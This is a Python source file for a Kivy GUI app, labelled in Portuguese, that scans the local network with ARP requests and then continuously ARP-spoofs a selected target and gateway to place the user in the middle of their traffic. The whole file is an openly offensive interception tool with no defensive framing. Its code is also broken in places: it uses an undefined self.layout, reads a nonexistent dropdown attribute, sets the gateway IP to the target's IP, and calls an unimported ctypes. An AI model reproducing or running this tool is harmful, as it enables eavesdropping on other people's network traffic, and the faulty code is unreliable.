import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.dropdown import DropDown
from scapy.all import *
import threading
import socket
import os
import sys

def discover_devices():
    local_ip = socket.gethostbyname(socket.gethostname())
    print(f"Local IP: {local_ip}")

    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=local_ip + "/24")
    answered_list, _ = srp(arp_request, timeout=2, verbose=False)

    devices = {}
    for _, r in answered_list:
        devices[r[ARP].psrc] = r[Ether].src
    
    return devices

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    for _, r in ans:
        return r[Ether].src
    return None

def spoof(target_ip, host_ip, target_mac, host_mac):
    packet_target = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
    packet_host = ARP(op=2, pdst=host_ip, psrc=target_ip, hwdst=host_mac)
    send(packet_target, verbose=False)
    send(packet_host, verbose=False)

def restore(target_ip, host_ip, target_mac, host_mac):
    packet_target = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac, hwsrc=host_mac)
    packet_host = ARP(op=2, pdst=host_ip, psrc=target_ip, hwdst=host_mac, hwsrc=target_mac)
    send(packet_target, count=4, verbose=False)
    send(packet_host, count=4, verbose=False)

class ARPSpooferApp(App):
    def build(self):
        self.spoofing = False
        self.devices = {}

        layout = BoxLayout(orientation='vertical')

        self.discover_button = Button(text='Descobrir Dispositivos')
        self.discover_button.bind(on_press=self.discover_devices_action)
        layout.add_widget(self.discover_button)

        self.device_dropdown = DropDown()
        self.device_label = Label(text='Dispositivos encontrados:')
        self.layout.add_widget(self.device_label)

        self.device_list_label = Label(text='')
        self.layout.add_widget(self.device_list_label)

        self.target_ip_label = Label(text='IP do Alvo:')
        self.layout.add_widget(self.target_ip_label)
        self.target_ip_input = TextInput()
        self.layout.add_widget(self.target_ip_input)

        self.gateway_ip_label = Label(text='IP do Gateway:')
        self.layout.add_widget(self.gateway_ip_label)
        self.gateway_ip_input = TextInput()
        self.layout.add_widget(self.gateway_ip_input)

        self.start_button = Button(text='Iniciar Spoofing')
        self.start_button.bind(on_press=self.start_spoofing)
        self.layout.add_widget(self.start_button)

        self.stop_button = Button(text='Parar Spoofing', disabled=True)
        self.stop_button.bind(on_press=self.stop_spoofing)
        self.layout.add_widget(self.stop_button)

        return self.layout

    def discover_devices_action(self, instance):
        self.devices = discover_devices()
        self.device_dropdown.clear_widgets()

        for ip, mac in self.devices.items():
            btn = Button(text=f"{ip} ({mac})", size_hint_y=None, height=44)
            btn.bind(on_release=lambda btn: self.device_dropdown.select(btn.text))
            self.device_dropdown.add_widget(btn)

        self.device_list_label.text = 'Dispositivos encontrados:'
        self.device_dropdown.open(self.discover_button)

    def start_spoofing(self, instance):
        selected_device = self.device_dropdown.selected_option.text if self.device_dropdown.selected_option else None
        
        if not selected_device:
            print("Selecione um dispositivo alvo da lista.")
            return

        selected_ip, selected_mac = selected_device.split(" ")
        self.target_ip_input.text = selected_ip.strip()
        self.gateway_ip_input.text = selected_ip.strip()

        self.target_ip = self.target_ip_input.text.strip()
        self.gateway_ip = self.gateway_ip_input.text.strip()

        self.target_mac = get_mac(self.target_ip)
        self.gateway_mac = get_mac(self.gateway_ip)

        if self.target_mac is None or self.gateway_mac is None:
            print("Não foi possível obter os endereços MAC.")
            return

        self.spoofing = True
        self.start_button.disabled = True
        self.stop_button.disabled = False

        self.spoof_thread = threading.Thread(target=self.spoof_thread_func)
        self.spoof_thread.start()

    def spoof_thread_func(self):
        while self.spoofing:
            spoof(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
            spoof(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)
            time.sleep(2)

    def stop_spoofing(self, instance):
        self.spoofing = False
        if hasattr(self, 'spoof_thread') and self.spoof_thread.is_alive():
            self.spoof_thread.join()
        restore(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
        restore(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)
        self.start_button.disabled = False
        self.stop_button.disabled = True

if __name__ == '__main__':
    if os.name == 'posix' and os.getuid() != 0:
        print("O script precisa ser executado como root (ou com permissões de administrador no Windows).")
        sys.exit(1)
    elif os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("O script precisa ser executado com permissões de administrador.")
        sys.exit(1)

    ARPSpooferApp().run()
